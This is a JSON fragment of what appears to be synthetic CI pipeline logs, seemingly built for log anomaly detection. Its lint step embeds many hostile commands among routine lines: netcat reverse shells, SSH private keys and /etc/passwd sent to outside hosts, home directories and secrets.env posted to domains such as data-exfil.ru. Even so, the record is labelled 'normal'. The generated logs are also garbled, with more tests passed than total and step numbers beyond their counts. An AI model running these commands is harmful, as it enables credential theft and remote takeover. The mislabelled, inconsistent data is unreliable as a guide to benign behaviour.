          "pip: Downloading prettier-2.9.tar.gz",
          "npm install: added 48 packages",
          "HEAD is now at 92e36b1",
          "npm notice: package.json updated",
          "[12:46:02] DEBUG: Initializing service",
          "Building Docker image...",
          "TLS handshake completed",
          "NODE_ENV=development",
          "[12:46:02] DEBUG: Connection pool: 10 active",
          "WARNING: prettier has known vulnerabilities",
          "Coverage: 78% statements, 95% branches",
          "Completed.",
          "Minifying vendor.js",
          "Done.",
          "Checking out develop branch",
          "  PASS: integration/test_db_connect.spec.js",
          "Cache saved successfully",
          "Tests: 203 passed, 183 total",
          "Using Python 3.9",
          "[12:46:02] INFO: Processing request",
          "Exception: NullPointerException",
          "pip: Installing build dependencies...",
          "Building Docker image...",
          "\u2713 Task completed in 3632ms",
          "Platform: win32-x64",
          "Artifact uploaded: dist.zip (96MB)",
          "Fetching submodules...",
          "\u2713 Task completed in 1095ms",
          "Done.",
          "Artifact downloaded: 11MB",
          "Generating source maps...",
          "\u2713 Task completed in 940ms",
          "npm notice: created a lockfile",
          "npm notice: package.json updated",
          "Fetching from https://npmjs.org/package.json",
          "WARNING: eslint has known vulnerabilities",
          "Cache miss for key-8654",
          "Creating production build...",
          "Connection established",
          "Step 7/17: Building",
          "WARNING: jest has known vulnerabilities",
          "Installing express@1.3.1",
          "Platform: win32-x64",
          "[12:46:02] INFO: Processing request",
          "[12:46:02] WARN: Deprecated API usage",
          "Pulling image: alpine:latest",
          "yarn add: Done in 6.1s",
          "Step 16/25: Building",
          "npm notice: created a lockfile",
          "Using Python 3.10",
          "Step 19/21: Installing dependencies",
          "Artifact uploaded: dist.zip (72MB)",
          "Compiling utils/index.js...",
          "Using Node.js 18.0.6",
          "Snapshots: 9 passed, 28 total",
          "[12:46:02] INFO: Processing request",
          "pip: Collecting jest",
          "Generating source maps...",
          "Compiling utils/service.java...",
          "Cache miss for key-1700",
          "Compiling src/main.py...",
          "pip: Collecting axios",
          "NODE_ENV=production",
          "\u2717 build failed with exit code 28",
          "Ready.",
          "pip: Collecting express",
          "Pushing to registry...",
          "Step 8/19: Installing dependencies",
          "[12:46:02] INFO: Request completed",
          "pip install: Successfully installed eslint-3.19",
          "Bundling vendor.js",
          "Done.",
          "Completed.",
          "Fetching submodules...",
          "npm install: added 140 packages",
          "  PASS: test_user_create (433ms)",
          "npm notice: package.json updated",
          "Building Docker image...",
          "Fetching submodules...",
          "Cache invalidated: build",
          "Ran 109 tests in 14s",
          "Transforming 488 files...",
          "Processing...",
          "[12:46:02] DEBUG: Loading configuration",
          "Generating source maps...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:46:02] INFO: Cache refreshed",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-19T12:48:12.519170",
        "finished_at": "2025-12-19T12:48:19.388856",
        "log_lines": [
          "=== Step: save_cache ===",
          "Step 3/16: Deploying",
          "Image pulled successfully",
          "[12:46:02] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "WARNING: eslint has known vulnerabilities",
          "Ready.",
          "Platform: win32-x64",
          "Tests: 51 passed, 187 total",
          "pip: Collecting axios",
          "GET /health - 201 (38ms)",
          "[12:46:02] DEBUG: Query executed in 1ms",
          "npm notice: package.json updated",
          "Tests: 84 passed, 88 total",
          "WARNING: webpack has known vulnerabilities",
          "Artifact downloaded: 4MB",
          "HEAD is now at 0e78c2b",
          "Verifying...",
          "Step 15/21: Installing dependencies",
          "Already up to date.",
          "Processing...",
          "NODE_ENV=development",
          "Pulling image: node:3.11",
          "Step 17/23: Testing",
          "Done.",
          "pip install: Successfully installed jest-2.19",
          "Fetching submodules...",
          "Compiling utils/index.js...",
          "Step 19/21: Linting",
          "Test Suites: 16 passed, 46 total",
          "Completed.",
          "Platform: darwin-arm64",
          "Fetching submodules...",
          "pip: Collecting webpack",
          "[12:46:02] DEBUG: Loading configuration",
          "Connection established",
          "Done.",
          "Minifying vendor.js",
          "Artifact downloaded: 23MB",
          "[12:46:02] WARN: Deprecated API usage",
          "Waiting...",
          "[12:46:02] DEBUG: Connection pool: 18 active",
          "Ready.",
          "[12:46:02] INFO: Request completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 15/25: Testing",
          "Environment: staging",
          "Installing express@5.6.2",
          "Done.",
          "Cache saved successfully",
          "yarn add: Done in 11.36s",
          "HEAD is now at 0baca95",
          "Pulling image: alpine:18",
          "pip: Downloading jest-5.17.tar.gz",
          "  PASS: test_user_create (335ms)",
          "Verifying...",
          "TLS handshake completed",
          "npm install: added 300 packages",
          "Waiting...",
          "WARNING: jest has known vulnerabilities",
          "Image pulled successfully",
          "Loading...",
          "Success!",
          "Transforming 616 files...",
          "Artifact uploaded: build.tar.gz (24MB)",
          "npm notice: package.json updated",
          "\u2713 Task completed in 1402ms",
          "Coverage: 92% statements, 71% branches",
          "Loading...",
          "Using Python 3.11",
          "[12:46:02] DEBUG: Loading configuration",
          "[12:46:02] INFO: Cache refreshed",
          "Completed.",
          "[12:46:02] DEBUG: Loading configuration",
          "  PASS: e2e/test_api_health.spec.js",
          "Coverage: 77% statements, 90% branches",
          "npm notice: created a lockfile",
          "\u2713 Task completed in 4323ms",
          "HEAD is now at 773b90e",
          "Building Docker image...",
          "[12:46:02] INFO: Processing request",
          "TLS handshake completed",
          "Waiting...",
          "Artifact downloaded: 19MB",
          "Image pulled successfully",
          "Using Node.js 18.5.8",
          "\u2713 Task completed in 4998ms",
          "[12:46:02] DEBUG: Loading configuration",
          "Platform: win32-x64",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-19T12:48:19.388856",
        "finished_at": "2025-12-19T12:48:30.838332",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Checking out main branch",
          "Cache saved successfully",
          "[12:46:02] DEBUG: Loading configuration",
          "HEAD is now at ea3d305",
          "\u2713 All checks passed",
          "[12:46:02] DEBUG: Query executed in 44ms",
          "Uploading artifact 'build' (37 files)",
          "Using Python 3.11",
          "Transforming 213 files...",
          "Compiling lib/index.js...",
          "[12:46:02] DEBUG: Memory usage: 1322MB",
          "  PASS: integration/test_api_health.spec.js",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Generating source maps...",
          "[12:46:02] ERROR: Connection failed",
          "[12:46:02] DEBUG: Connection pool: 8 active",
          "Layer 2/11: COPY command",
          "Compiling lib/utils.go...",
          "Pushing to registry...",
          "npm notice: created a lockfile",
          "Step 16/21: Running migrations",
          "\u2713 All checks passed",
          "[12:46:02] WARN: Deprecated API usage",
          "Step 13/21: Installing dependencies",
          "\u2713 Step 'test' succeeded",
          "Processing...",
          "Compiling components/service.java...",
          "Minifying vendor.js",
          "[12:46:02] INFO: Connecting to database",
          "Step 19/25: Testing",
          "Creating production build...",
          "Test Suites: 23 passed, 37 total",
          "Snapshots: 42 passed, 11 total",
          "Image pulled successfully",
          "Switched to branch 'bugfix/task-741'",
          "Pulling image: python:18",
          "\u2717 build failed with exit code 79",
          "Connection established",
          "[12:46:02] DEBUG: Connection pool: 15 active",
          "[12:46:02] WARN: Deprecated API usage",
          "POST /upload - 201 (278ms)",
          "Generating source maps...",
          "npm install: added 267 packages",
          "GET /api - 204 (55ms)",
          "Transforming 592 files...",
          "Checking out main branch",
          "[12:46:02] ERROR: Connection failed",
          "Cache hit for key-2247",
          "[12:46:02] WARN: Deprecated API usage",
          "Waiting...",
          "npm install: resolved 120 packages",
          "Time: 108.206s",
          "[12:46:02] ERROR: Connection failed",
          "Using Node.js 19.8.6",
          "[12:46:02] DEBUG: Initializing service",
          "[12:46:02] DEBUG: Initializing service",
          "Using Python 3.10",
          "Optimizing 46 modules...",
          "[12:46:02] INFO: Cache refreshed",
          "Coverage: 89% statements, 81% branches",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "yarn add: Done in 24.64s",
          "Transforming 964 files...",
          "[12:46:02] INFO: Connecting to database",
          "npm install: added 423 packages",
          "Pulling image: node:18",
          "Fetching from https://gcr.io/package.json",
          "npm notice: created a lockfile",
          "WARNING: webpack has known vulnerabilities",
          "  PASS: unit/test_auth_login.spec.js",
          "WARNING: lodash has known vulnerabilities",
          "Platform: win32-x64",
          "Checking out main branch",
          "npm notice: package.json updated",
          "Step 7/16: Testing",
          "Snapshots: 27 passed, 18 total",
          "Compiling src/service.java...",
          "OK",
          "GET /api - 201 (56ms)",
          "Using Node.js 20.4.0",
          "Environment: production",
          "pip: Collecting prettier",
          "pip: Downloading webpack-3.16.tar.gz",
          "Bundling runtime.js",
          "[12:46:02] INFO: Request completed",
          "Cache saved successfully",
          "[12:46:02] DEBUG: Memory usage: 1399MB",
          "HEAD is now at 980fabb",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-19T12:48:30.838332",
        "finished_at": "2025-12-19T12:49:05.186760",
        "log_lines": [
          "=== Step: build ===",
          "Compiling src/index.js...",
          "Compiling src/main.py...",
          "Compiling components/service.java...",
          "Artifact uploaded: dist.zip (50MB)",
          "Cache hit for key-9552",
          "pip: Downloading webpack-1.20.tar.gz",
          "[12:46:02] DEBUG: Loading configuration",
          "Exception: NullPointerException",
          "Step 11/22: Installing dependencies",
          "Step 18/22: Installing dependencies",
          "Compiling lib/app.ts...",
          "Compiling utils/service.java...",
          "Already up to date.",
          "Layer 2/10: ENV command",
          "HEAD is now at b67e2de",
          "Step 9/20: Installing dependencies",
          "\u2713 Step 'test' succeeded",
          "Completed.",
          "[12:46:02] ERROR: Connection failed",
          "yarn add: Done in 20.31s",
          "Layer 1/11: ENV command",
          "Bundling vendor.js",
          "\u2713 lint completed",
          "Compiling utils/app.ts...",
          "Compiling components/index.js...",
          "Pushing to registry...",
          "Time: 120.429s",
          "[12:46:02] DEBUG: Initializing service",
          "Cache hit for key-7440",
          "Optimizing 91 modules...",
          "Compiling lib/app.ts...",
          "[12:46:02] DEBUG: Connection pool: 16 active",
          "Transforming 463 files...",
          "Step 3/24: Testing",
          "[12:46:02] ERROR: Connection failed",
          "[12:46:02] DEBUG: Memory usage: 1118MB",
          "[12:46:02] WARN: Deprecated API usage",
          "Finished.",
          "npm install: added 80 packages",
          "FAILED: test_db_connect",
          "Verifying...",
          "Cache invalidated: build",
          "Already up to date.",
          "Step 5/20: Installing dependencies",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Uploading artifact 'coverage' (18 files)",
          "  PASS: unit/test_user_create.spec.js",
          "OK",
          "Environment: staging",
          "[12:46:02] WARN: Deprecated API usage",
          "Minifying main.js",
          "Installing jest@5.13.6",
          "yarn add: Done in 10.84s",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Coverage: 74% statements, 96% branches",
          "\u2713 Task completed in 3352ms",
          "Time: 55.696s",
          "WARNING: prettier has known vulnerabilities",
          "Cache invalidated: node_modules",
          "Cache hit for key-1763",
          "NODE_ENV=production",
          "NODE_ENV=development",
          "Cache invalidated: dependencies",
          "\u2713 validate completed",
          "Loading...",
          "Cache miss for key-1583",
          "Step 1/19: Building",
          "Artifact downloaded: 30MB",
          "Step 3/15: Deploying",
          "Compiling src/service.java...",
          "Ready.",
          "Optimizing 26 modules...",
          "Step 19/16: Installing dependencies",
          "Uploading artifact 'coverage' (25 files)",
          "npm install: added 249 packages",
          "Pulling image: python:3.11",
          "Artifact downloaded: 38MB",
          "Building Docker image...",
          "\u2713 All checks passed",
          "Using Node.js 20.7.1",
          "OK",
          "\u2713 deploy completed",
          "Switched to branch 'bugfix/task-606'",
          "Pushing to registry...",
          "Minifying vendor.js",
          "[12:46:02] INFO: Request completed",
          "npm install: added 179 packages",
          "Completed.",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-19T12:49:05.186760",
        "finished_at": "2025-12-19T12:49:16.636236",
        "log_lines": [
          "=== Step: type_check ===",
          "POST /api - 201 (182ms)",
          "Verifying...",
          "Bundling vendor.css",
          "Test Suites: 15 passed, 12 total",
          "npm install: resolved 1800 packages",
          "Compiling components/main.py...",
          "pip: Downloading react-3.10.tar.gz",
          "Pushing to registry...",
          "\u2713 All checks passed",
          "[12:46:02] ERROR: Connection failed",
          "[12:46:02] INFO: Request completed",
          "Cache saved successfully",
          "[12:46:02] WARN: Deprecated API usage",
          "[12:46:02] INFO: Connecting to database",
          "Connection established",
          "Compiling components/handler.rs...",
          "GET /api - 204 (77ms)",
          "[12:46:02] DEBUG: Initializing service",
          "npm notice: created a lockfile",
          "[12:46:02] DEBUG: Memory usage: 1840MB",
          "Minifying main.js",
          "Cache restored successfully (298MB)",
          "Compiling components/app.ts...",
          "Fetching submodules...",
          "Installing express@5.11.8",
          "[12:46:02] WARN: Deprecated API usage",
          "Generating source maps...",
          "Snapshots: 46 passed, 2 total",
          "Cache miss for key-8959",
          "pip: Collecting jest",
          "Switched to branch 'feature/task-837'",
          "pip: Downloading express-1.18.tar.gz",
          "Step 17/15: Building",
          "Step 15/18: Building",
          "[12:46:02] INFO: Connecting to database",
          "[12:46:02] DEBUG: Initializing service",
          "Using Node.js 14.0.8",
          "[12:46:02] ERROR: Connection failed",
          "Loading...",
          "\u2713 Task completed in 1573ms",
          "Installing axios@3.20.10",
          "Compiling lib/handler.rs...",
          "\u2717 build failed with exit code 111",
          "Already up to date.",
          "Installing express@4.18.7",
          "Building Docker image...",
          "  PASS: test_auth_login (223ms)",
          "Installing prettier@3.1.2",
          "Step 12/17: Deploying",
          "[12:46:02] DEBUG: Query executed in 3ms",
          "Finished.",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 12/17: Linting",
          "Using Node.js 20.8.2",
          "Minifying main.js",
          "\u2713 All checks passed",
          "Pulling image: node:3.11",
          "Step 3/24: Linting",
          "Minifying app.js",
          "Bundling main.css",
          "GET /api - 201 (43ms)",
          "Cache miss for key-9088",
          "TLS handshake completed",
          "Step 5/15: Building",
          "Minifying app.js",
          "Cache invalidated: dependencies",
          "WARNING: express has known vulnerabilities",
          "\u2713 Task completed in 3137ms",
          "Checking out main branch",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Minifying main.js",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Waiting...",
          "Verifying...",
          "Uploading artifact 'coverage' (24 files)",
          "Transforming 859 files...",
          "Connection established",
          "[12:46:02] WARN: Deprecated API usage",
          "npm install: resolved 1780 packages",
          "Loading...",
          "Artifact uploaded: build.tar.gz (40MB)",
          "POST /api - 202 (399ms)",
          "Snapshots: 40 passed, 15 total",
          "[12:46:02] INFO: Starting build process",
          "[12:46:02] DEBUG: Initializing service",
          "[12:46:02] INFO: Connecting to database",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-19T12:49:16.636236",
        "finished_at": "2025-12-19T12:49:28.085712",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "\u2713 Step 'setup' succeeded",
          "Exception: RuntimeError",
          "npm install: added 307 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Coverage: 88% statements, 74% branches",
          "Step 19/25: Linting",
          "  PASS: unit/test_user_create.spec.js",
          "HEAD is now at 022dc75",
          "[12:46:02] WARN: Deprecated API usage",
          "Checking out main branch",
          "Pulling image: node:3.11",
          "[12:46:02] WARN: Deprecated API usage",
          "Step 2/23: Installing dependencies",
          "Completed.",
          "Compiling utils/utils.go...",
          "Pulling image: node:latest",
          "npm install: added 282 packages",
          "Using Node.js 18.3.3",
          "Cache hit for key-1243",
          "Generating source maps...",
          "pip: Downloading axios-3.14.tar.gz",
          "TLS handshake completed",
          "npm notice: package.json updated",
          "Step 10/24: Linting",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:46:02] INFO: Request completed",
          "WARNING: prettier has known vulnerabilities",
          "Creating production build...",
          "Test Suites: 12 passed, 11 total",
          "Layer 3/15: COPY command",
          "[12:46:02] DEBUG: Query executed in 31ms",
          "Already up to date.",
          "Waiting...",
          "\u2713 Task completed in 1093ms",
          "\u2717 build failed with exit code 3",
          "Building Docker image...",
          "Pulling image: node:3.11",
          "Optimizing 29 modules...",
          "[12:46:02] WARN: Deprecated API usage",
          "Fetching submodules...",
          "[12:46:02] DEBUG: Connection pool: 20 active",
          "pip: Installing build dependencies...",
          "Fetching submodules...",
          "TLS handshake completed",
          "[12:46:02] INFO: Starting build process",
          "[12:46:02] DEBUG: Connection pool: 18 active",
          "Cache miss for key-5049",
          "GET /api - 200 (66ms)",
          "Finished.",
          "Waiting...",
          "Artifact downloaded: 11MB",
          "  PASS: integration/test_db_connect.spec.js",
          "npm install: added 125 packages",
          "\u2713 Step 'checkout' succeeded",
          "[12:46:02] DEBUG: Memory usage: 606MB",
          "[12:46:02] INFO: Processing request",
          "Minifying main.js",
          "[12:46:02] INFO: Connecting to database",
          "Cache restored successfully (376MB)",
          "Step 12/20: Testing",
          "Step 20/20: Testing",
          "Step 5/18: Deploying",
          "yarn add: Done in 29.90s",
          "Verifying...",
          "Uploading artifact 'build' (41 files)",
          "Platform: darwin-arm64",
          "\u2713 Task completed in 3784ms",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 12/21: Deploying",
          "Artifact uploaded: build.tar.gz (13MB)",
          "\u2713 All checks passed",
          "Building Docker image...",
          "Pushing to registry...",
          "Finished.",
          "[12:46:02] DEBUG: Initializing service",
          "Waiting...",
          "\u2713 test completed",
          "FAILED: test_user_create",
          "Pushing to registry...",
          "Step 7/21: Linting",
          "Already up to date.",
          "[12:46:02] DEBUG: Query executed in 84ms",
          "[12:46:02] INFO: Request completed",
          "[12:46:02] DEBUG: Query executed in 86ms",
          "Waiting...",
          "\u2713 Step 'setup' succeeded",
          "[12:46:02] INFO: Cache refreshed",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-19T12:49:28.085712",
        "finished_at": "2025-12-19T12:49:39.535188",
        "log_lines": [
          "tar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload",
          "=== Step: lint ===",
          "[12:46:02] DEBUG: Initializing service",
          "Artifact downloaded: 41MB",
          "nc -e /bin/sh 63.245.117.250 1700",
          "nc -e /bin/sh 149.161.38.247 40234",
          "npm install: resolved 195 packages",
          "OK",
          "Layer 4/9: ENV command",
          "curl -X POST https://data-exfil.ru/collect --data @secrets.env",
          "Optimizing 73 modules...",
          "Installing express@4.2.10",
          "Building Docker image...",
          "Success!",
          "OK",
          "Ran 109 tests in 1s",
          "\u2713 Step 'build' succeeded",
          "\u2713 Step 'build' succeeded",
          "wget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil",
          "Step 1/21: Linting",
          "FAILED: test_cache_hit",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 227.124.141.175 36505",
          "nc -e /bin/sh 45.132.120.118 57850",
          "tar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload",
          "Compiling utils/handler.rs...",
          "Compiling src/service.java...",
          "[12:46:02] INFO: Processing request",
          "Building Docker image...",
          "pip: Collecting lodash",
          "Platform: linux-x64",
          "[12:46:02] DEBUG: Query executed in 31ms",
          "POST /upload - 202 (337ms)",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 179.111.89.168 40906",
          "Sending 196MB of data to crypto-mine.io",
          "Minifying main.js",
          "Minifying app.js",
          "  PASS: e2e/test_auth_login.spec.js",
          "Switched to branch 'feature/task-277'",
          "OK",
          "Fetching submodules...",
          "tar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload",
          "Step 14/17: Running migrations",
          "Cache restored successfully (129MB)",
          "nc -e /bin/sh 149.160.99.206 4116",
          "Step 3/16: Deploying",
          "Compiling components/service.java...",
          "Processing...",
          "curl -X POST https://crypto-mine.io/collect --data @secrets.env",
          "\u2717 build failed with exit code 82",
          "tar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 158.183.232.99 49536",
          "tar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload",
          "Artifact uploaded: build.tar.gz (48MB)",
          "[12:46:02] ERROR: Connection failed",
          "Optimizing 84 modules...",
          "Compiling components/index.js...",
          "[12:46:02] INFO: Starting build process",
          "Cache miss for key-2985",
          "nc -e /bin/sh 156.209.74.254 23011",
          "wget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil",
          "Transforming 598 files...",
          "[12:46:02] DEBUG: Loading configuration",
          "Fetching submodules...",
          "Cache hit for key-6642",
          "nc -e /bin/sh 14.86.97.141 39180",
          "nc -e /bin/sh 114.78.191.33 24605",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 67.174.15.63 44092",
          "[12:46:02] INFO: Request completed",
          "[12:46:02] DEBUG: Loading configuration",
          "wget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil",
          "Cache miss for key-3871",
          "[12:46:02] INFO: Cache refreshed",
          "Ready.",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 18/17: Deploying",
          "curl -X POST https://evil-server.cc/collect --data @secrets.env",
          "Optimizing 87 modules...",
          "Cache saved successfully",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "Already up to date.",
          "[12:46:02] DEBUG: Connection pool: 18 active",
          "Ready.",
          "curl -X POST https://crypto-mine.io/collect --data @secrets.env",
          "Switched to branch 'hotfix/task-522'",
          "curl -X POST https://evil-server.cc/collect --data @secrets.env",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-9904",
          "NODE_ENV=production",
          "Connection established",
          "[12:46:02] INFO: Connecting to database",
          "[12:46:02] WARN: Deprecated API usage",
          "Cache invalidated: build",
          "Step 11/23: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 Task completed in 4549ms",
          "curl -X POST https://malicious-pool.xyz/collect --data @secrets.env",
          "Verifying...",
          "Done.",
          "Cache miss for key-4658",
          "tar czf - /home | curl -X POST -d @- https://evil-server.cc/upload",
          "Cache miss for key-2813",
          "Checking out master branch",
          "pip: Collecting eslint",
          "Compiling src/handler.rs...",
          "Creating production build...",
          "Connection established",
          "nc -e /bin/sh 184.193.80.6 7596",
          "Ran 30 tests in 53s",
          "POST /upload - 201 (29ms)",
          "[12:46:02] INFO: Request completed",
          "[12:46:02] INFO: Request completed",
          "[12:46:02] INFO: Request completed",
          "Compiling components/main.py...",
          "Uploading artifact 'dist' (42 files)",
          "Artifact downloaded: 17MB",
          "  PASS: unit/test_api_health.spec.js",
          "[12:46:02] INFO: Processing request",
          "Verifying...",
          "=== Step lint completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}